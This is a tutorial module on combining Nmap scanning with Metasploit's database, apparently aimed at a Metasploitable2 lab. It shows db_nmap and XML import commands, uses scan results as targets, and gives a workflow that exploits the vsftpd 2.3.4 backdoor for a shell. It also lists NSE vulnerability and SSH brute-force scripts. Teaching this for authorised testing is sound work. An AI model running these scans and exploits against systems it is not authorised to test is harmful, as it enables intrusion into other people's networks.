# Module 14 — Metasploit with Nmap Integration (1)

> 🟡 **Intermediate Level** | Combine the best scanner with the best exploitation framework
> 

---

# 🗃️ Metasploit with Nmap Integration

## 🤔 Why Combine Nmap + Metasploit?

**Nmap** is the gold standard for network discovery and port scanning. **Metasploit** is the gold standard for exploitation. Together they form a complete attack pipeline:

```
Nmap scans → Finds hosts/services → Imports to MSF DB → Target modules at findings
```

---

## 🚀 Method 1: db_nmap (Run Nmap FROM msfconsole)

```bash
# Run Nmap and automatically save results to MSF database:
msf6 > db_nmap [NMAP OPTIONS] TARGET

# Basic scan:
msf6 > db_nmap 192.168.1.20

# Service version detection:
msf6 > db_nmap -sV 192.168.1.20

# Full scan (OS detection + scripts + version):
msf6 > db_nmap -A 192.168.1.20

# Scan entire subnet:
msf6 > db_nmap -sV 192.168.1.0/24

# Scan specific ports only:
msf6 > db_nmap -sV -p 21,22,80,445,3389 192.168.1.20

# All ports:
msf6 > db_nmap -sV -p- 192.168.1.20

# Aggressive + no ping:
msf6 > db_nmap -A -Pn 192.168.1.20

# After scanning, view results:
msf6 > hosts          # All discovered hosts
msf6 > services       # All discovered services
msf6 > services -p 445  # Only SMB services
msf6 > services -s http # Only HTTP services
```

---

## 🚀 Method 2: Import External Nmap XML Scan

```bash
# Run Nmap externally and save as XML:
nmap -sV -A -oX /tmp/scan.xml 192.168.1.0/24

# Import into Metasploit:
msf6 > db_import /tmp/scan.xml

# Output:
# [*] Importing 'Nmap XML' data
# [*] Import: Parsing with 'Nokogiri v1.x.x'
# [*] Importing host 192.168.1.20
# [*] Successfully imported /tmp/scan.xml

# Now all hosts and services are in the database:
msf6 > hosts
msf6 > services
```

---

## 🎯 Using DB Results to Target Modules

```bash
# Scan first:
msf6 > db_nmap -sV 192.168.1.0/24

# Services found:
msf6 > services
# host          port  proto  name   state  info
# 192.168.1.20  21    tcp    ftp    open   vsftpd 2.3.4
# 192.168.1.20  22    tcp    ssh    open   OpenSSH 4.7
# 192.168.1.20  80    tcp    http   open   Apache 2.2.8
# 192.168.1.20  445   tcp    smb    open   Samba 3.0.20

# Use services results directly as RHOSTS:
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 -R
# -R flag: uses results as RHOSTS automatically!
msf6 auxiliary(scanner/smb/smb_version) > run

# Or use hosts as RHOSTS:
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > hosts -R
msf6 auxiliary(scanner/portscan/tcp) > run
```

---

## 📊 Complete Workflow: Nmap → MSF → Exploit

```bash
# Full integrated workflow:

# Step 1: Create workspace
msf6 > workspace -a target_network

# Step 2: Scan with db_nmap
msf6 > db_nmap -sV -A -p 1-10000 192.168.1.0/24

# Step 3: Review findings
msf6 > hosts
msf6 > services
msf6 > services -p 21        # Who has FTP?
msf6 > services -p 445       # Who has SMB?
msf6 > services -s vsftpd    # Find vsftpd specifically

# Step 4: Target a service
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit > services -p 21 -R   # Use FTP hosts as targets
msf6 exploit > set PAYLOAD cmd/unix/interact
msf6 exploit > run

# Step 5: Document findings
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > db_export -f xml /tmp/engagement_results.xml
```

---

## 📊 Nmap NSE Scripts + Metasploit

```bash
# Run vulnerability scripts with Nmap:
nmap --script vuln 192.168.1.20 -oX /tmp/vuln_scan.xml

# Import results:
msf6 > db_import /tmp/vuln_scan.xml

# View vulnerabilities:
msf6 > vulns

# Common NSE scripts for pen testing:
nmap --script smb-vuln-ms17-010 192.168.1.20
nmap --script ftp-anon 192.168.1.20
nmap --script ssh-brute 192.168.1.20
nmap --script http-enum 192.168.1.20
```

---

> ✅ **Nmap integration complete! Now do a full practical lab on Metasploitable2.**
> 

---

## Enhancement — db_nmap vs plain nmap (added)

`nmap` from the `msf6 >` prompt runs normally but results are **display-only** — not stored. `db_nmap` runs identical flags but automatically stores hosts/ports/services/OS-detection into the active workspace, making them instantly queryable by every other module (`hosts`, `services`, `hosts -R`).

```bash
msf6 > db_nmap -sV -O 10.0.0.5
[*] Nmap: 445/tcp open microsoft-ds?
...
msf6 > services
host       port  proto  name          state  info
10.0.0.5   445   tcp    microsoft-ds  open
```

**Vulnerability-scanning pattern this enables:** review service versions from `db_nmap` output → `search type:auxiliary <service_or_cve>` → load, `hosts -R` or `services -R` for RHOSTS, run → check `vulns` for what got recorded with CVE references. A version string like `vsftpd 2.3.4` immediately narrows your search space to a handful of relevant scanner modules — you don't need to run every scanner against every host.